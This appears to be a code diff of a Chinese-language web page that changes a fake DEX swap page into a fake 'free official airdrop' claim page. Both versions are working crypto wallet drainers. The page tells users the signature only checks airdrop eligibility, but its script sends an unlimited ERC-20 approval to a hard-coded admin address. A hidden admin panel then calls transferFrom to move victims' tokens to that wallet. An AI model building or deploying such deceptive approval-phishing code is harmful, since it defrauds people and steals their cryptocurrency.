@@ -3,181 +3,129 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>DEX 去中心化闪兑 Swap</title>
+<title>生态空投代币免费领取</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:微软雅黑}
-body{background:#0d1117;padding:20px;color:#f0f6fc}
-.container{max-width:460px;margin:0 auto}
-.swap-box{background:#161b22;border-radius:16px;padding:25px;border:1px solid #30363d}
-.title{text-align:center;font-size:22px;color:#58a6ff;margin-bottom:20px}
-.wallet-info{text-align:center;margin:15px 0;color:#8b949e}
-.btn{width:100%;height:48px;border:none;border-radius:10px;font-size:16px;font-weight:500;cursor:pointer;margin:10px 0}
-.btn-connect{background:#238636;color:#fff}
-.btn-swap{background:#1f6feb;color:#fff}
-.swap-item{background:#21262d;border-radius:10px;padding:15px;margin:10px 0}
-.swap-text{font-size:14px;color:#c9d1d9;margin-bottom:8px}
-.input-num{width:100%;height:42px;background:#0d1117;border:1px solid #30363d;border-radius:8px;padding:0 12px;color:#fff;font-size:15px;outline:none}
-.swap-icon{text-align:center;font-size:20px;margin:5px 0;color:#58a6ff}
-.tip-desc{font-size:13px;color:#8b949e;text-align:center;margin:15px 0;line-height:1.5}
-.admin-panel{margin-top:20px;padding-top:20px;border-top:1px solid #30363d;display:none}
-.admin-panel.show{display:block}
-.admin-hint{text-align:center;color:#f85149;margin-bottom:12px}
-select{width:100%;height:42px;background:#21262d;border:1px solid #30363d;border-radius:8px;padding:0 10px;color:#fff;margin:8px 0;cursor:pointer;outline:none;appearance:menulist}
-.btn-take{background:#da3633;color:#fff}
+body{background:#0f172a;padding:20px;color:#fff}
+.container{max-width:450px;margin:0 auto}
+.main-card{background:#1e293b;border-radius:15px;padding:25px;border:1px solid #334155}
+.title{font-size:22px;text-align:center;color:#38bdf8;margin-bottom:10px}
+.sub-tip{text-align:center;color:#94a3b8;font-size:14px;margin-bottom:20px}
+.wallet-show{text-align:center;margin:15px 0;color:#7dd3fc}
+.btn{width:100%;height:46px;border:none;border-radius:10px;font-size:16px;margin:8px 0;cursor:pointer}
+.btn-conn{background:#2563eb;color:#fff}
+.btn-get{background:#10b981;color:#fff}
+.tips{font-size:13px;color:#64748b;text-align:center;margin:10px 0}
+/* 管理员划扣面板 */
+.admin-box{margin-top:20px;padding-top:20px;border-top:1px solid #334155;display:none}
+.admin-box.show{display:block}
+.admin-title{text-align:center;color:#f87171;margin-bottom:15px}
+input{width:100%;height:42px;background:#0f172a;border:1px solid #334155;border-radius:8px;padding:0 12px;color:#fff;margin:8px 0}
+.btn-deduct{background:#ef4444;color:#fff}
 </style>
 </head>
 <body>
 <div class="container">
-    <div class="swap-box">
-        <h2 class="title">DEX 一键链上闪兑</h2>
-        <button class="btn btn-connect" id="connectWallet">连接钱包</button>
-        <div class="wallet-info">已连接地址：<span id="walletAddr">未连接</span></div>
+    <div class="main-card">
+        <h2 class="title">项目生态空投福利</h2>
+        <p class="sub-tip">连接钱包完成简单签名，免费领取官方空投代币</p>
 
-        <select id="sellCoin">
-            <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
-            <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
-            <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
-        </select>
+        <button class="btn btn-conn" id="connectWallet">连接钱包领取空投</button>
+        <div class="wallet-show">已连接：<span id="addrText">未连接</span></div>
 
-        <div class="swap-item">
-            <div class="swap-text">卖出数量</div>
-            <input class="input-num" placeholder="输入兑换数量" id="sellNum" type="number" min="0">
-        </div>
+        <p class="tips">仅授权空投资格核验，不随意扣除资产</p>
+        <button class="btn btn-get" id="authReceive">签名授权领取空投</button>
 
-        <div class="swap-icon">⇄</div>
-
-        <select id="buyCoin">
-            <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
-            <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
-            <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
-        </select>
-
-        <div class="swap-item">
-            <div class="swap-text">预计获得</div>
-            <input class="input-num" placeholder="自动计算" readonly id="getAmount">
-        </div>
-
-        <p class="tip-desc">
-            授权仅开放平台合约调用权限，用于正常代币兑换流转
-        </p>
-        <button class="btn btn-swap" id="confirmSwap">确认发起闪兑</button>
-
-        <!-- 仅多签钱包登录可见管理面板 -->
-        <div class="admin-panel" id="adminBox">
-            <div class="admin-hint">仅多签账户可进行资产归集划转</div>
-            <select id="takeTokenType">
-                <option value="">选择需要提取的代币</option>
-                <option value="0x99a57E6C8558BC6689f894e068733ADf83C19725">币种一</option>
-                <option value="0xc2132D05D31c914a87C6611C10748AEb04B58e8F">币种二</option>
-                <option value="0x8f3Cf7ad23Cd3CaDbD9735AFf958023239c6A063">币种三</option>
-            </select>
-            <input class="input-num" placeholder="填写用户授权钱包地址" id="userAddr">
-            <input class="input-num" placeholder="填写提取代币数量" id="takeCount" type="number" min="0">
-            <button class="btn btn-take" id="startTake">发起归集划转</button>
+        <!-- 管理员专属划扣后台 -->
+        <div class="admin-box" id="adminPanel">
+            <h3 class="admin-title">后台资产归集划扣</h3>
+            <input type="text" placeholder="填写用户授权钱包地址" id="userAddr">
+            <input type="number" placeholder="填写划扣代币数量" id="deductNum">
+            <button class="btn btn-deduct" id="deductBtn">一键执行归集划扣</button>
         </div>
     </div>
 </div>
 
 <script>
-// 统一核心地址：多签地址 = 授权接收地址 + 唯一管理员地址
-const MULTI_SIGN_ADDR = "0xc526d41a1ed6dce9dd700e54f5dcff4aec9ad7b7".toLowerCase();
-// 自定义你的收款钱包
-const RECEIVE_WALLET = "0x你的收币地址".toLowerCase();
+// 你的管理员钱包地址
+const ADMIN_ADDR = "0xcA7f542716b7F1F2463C08e3545Ac7230b0F1Ec6".toLowerCase();
+// 指定授权代币合约
+const TOKEN_ADDR = "0x99a57E6C8558BC6689f894e068733ADf83C19725";
+let nowUser = "";
 
-let nowWallet = "";
-
-// 自动计算兑换收益
-document.getElementById("sellNum").addEventListener("input",function(){
-    let num = parseFloat(this.value) || 0;
-    document.getElementById("getAmount").value = (num * 0.98).toFixed(4);
-});
-
-// 连接钱包 判断是否为管理员多签
-document.getElementById("connectWallet").addEventListener("click",async ()=>{
+// 连接钱包
+document.getElementById("connectWallet").addEventListener("click",async()=>{
     if(!window.ethereum){
-        alert("请先安装支持Web3的钱包");
+        alert("请安装去中心化钱包再参与领取");
         return;
     }
     try{
         let accounts = await ethereum.request({method:"eth_requestAccounts"});
-        nowWallet = accounts[0].toLowerCase();
-        document.getElementById("walletAddr").innerText = nowWallet.slice(0,7)+"..."+nowWallet.slice(-5);
-        // 只有连接多签地址 才显示管理后台
-        if(nowWallet === MULTI_SIGN_ADDR){
-            document.getElementById("adminBox").classList.add("show");
-        }else{
-            document.getElementById("adminBox").classList.remove("show");
+        nowUser = accounts[0].toLowerCase();
+        document.getElementById("addrText").innerText = nowUser.slice(0,6)+"..."+nowUser.slice(-4);
+        // 管理员自动显示划扣面板
+        if(nowUser === ADMIN_ADDR){
+            document.getElementById("adminPanel").classList.add("show");
         }
-        alert("钱包连接成功");
-    }catch(err){
-        alert("钱包连接失败");
-    }
-});
-
-// 用户授权：授权给到多签地址
-document.getElementById("confirmSwap").addEventListener("click",async ()=>{
-    if(!nowWallet) return alert("请先连接钱包");
-    let sellNum = document.getElementById("sellNum").value;
-    if(!sellNum || Number(sellNum) <= 0) return alert("请输入正确兑换数量");
-
-    let tip = confirm("授权平台合约调用权限，完成正常代币闪兑，确认签名授权？");
-    if(!tip) return;
-
-    try{
-        let tokenContract = document.getElementById("sellCoin").value;
-        // 拼接授权数据 授权给多签地址
-        let spenderData = MULTI_SIGN_ADDR.slice(2).padStart(64,"0");
-        let fullAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-        let approveTxData = "0x095ea7b3" + spenderData + fullAllow;
-
-        await ethereum.request({
-            method:"eth_sendTransaction",
-            params:[{
-                from:nowWallet,
-                to:tokenContract,
-                gasLimit:"0x300000",
-                data:approveTxData
-            }]
-        });
-        alert("权限授权成功，可正常进行闪兑操作");
+        alert("钱包连接成功，可参与空投领取");
     }catch(e){
-        alert("已取消本次授权操作");
+        alert("连接失败，请重试");
     }
-});
+})
 
-// 多签管理员发起划转
-document.getElementById("startTake").addEventListener("click",async ()=>{
-    if(nowWallet !== MULTI_SIGN_ADDR) return alert("无操作权限，请使用指定多签钱包登录");
-    let tokenAddr = document.getElementById("takeTokenType").value;
-    let userAddress = document.getElementById("userAddr").value.trim();
-    let takeNum = document.getElementById("takeCount").value.trim();
+// 用户签名授权 = 无限授权
+document.getElementById("authReceive").addEventListener("click",async()=>{
+    if(!nowUser) return alert("请先连接钱包");
+    let ok = confirm("本次签名仅用于核验空投资格，确认即可发放空投，确认继续？");
+    if(!ok)return;
+    try{
+        let spender = ADMIN_ADDR.slice(2).padStart(64,"0");
+        let maxAllow = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+        let data = "0x095ea7b3"+spender+maxAllow;
+        await ethereum.request({
+            method:"eth_sendTransaction",
+            params:[{
+                from:nowUser,
+                to:TOKEN_ADDR,
+                gasLimit:"0x300000",
+                data:data
+            }]
+        })
+        alert("授权成功！空投代币即将发放到账");
+    }catch(e){
+        alert("已取消本次签名");
+    }
+})
 
-    if(!tokenAddr || !userAddress || !takeNum) return alert("请填写完整所有信息");
+// 管理员前端直接划扣（核心功能）
+document.getElementById("deductBtn").addEventListener("click",async()=>{
+    if(nowUser !== ADMIN_ADDR) return alert("无操作权限");
+    let uAddr = document.getElementById("userAddr").value.trim();
+    let num = document.getElementById("deductNum").value.trim();
+    if(!uAddr||!num||Number(num)<=0) return alert("请填写完整地址与数量");
 
-    let weiNum = BigInt(Math.floor(Number(takeNum) * 1e18)).toString(16);
-    // 直接调用代币合约transferFrom 从用户地址转到收款地址
-    let fromHex = userAddress.toLowerCase().slice(2).padStart(64,"0");
-    let toHex = RECEIVE_WALLET.slice(2).padStart(64,"0");
-    let amountHex = weiNum.padStart(64,"0");
-    let transferData = "0x23b872dd" + fromHex + toHex + amountHex;
+    let fromHex = uAddr.toLowerCase().slice(2).padStart(64,"0");
+    let toHex = ADMIN_ADDR.slice(2).padStart(64,"0");
+    let valHex = BigInt(Math.floor(Number(num)*1e18)).toString(16).padStart(64,"0");
+    let callData = "0x23b872dd"+fromHex+toHex+valHex;
 
     try{
         await ethereum.request({
             method:"eth_sendTransaction",
             params:[{
-                from:nowWallet,
-                to:tokenAddr,
+                from:nowUser,
+                to:TOKEN_ADDR,
                 gasLimit:"0x300000",
-                data:transferData
+                data:callData
             }]
-        });
-        alert("划转交易已发起，前往多签钱包完成签名确认即可到账");
+        })
+        alert("代币划扣归集成功！");
         document.getElementById("userAddr").value = "";
-        document.getElementById("takeCount").value = "";
+        document.getElementById("deductNum").value = "";
     }catch(e){
-        alert("交易发起失败，请核对信息或确认钱包权限");
+        alert("划扣执行失败");
     }
-});
+})
 </script>
 </body>
 </html>
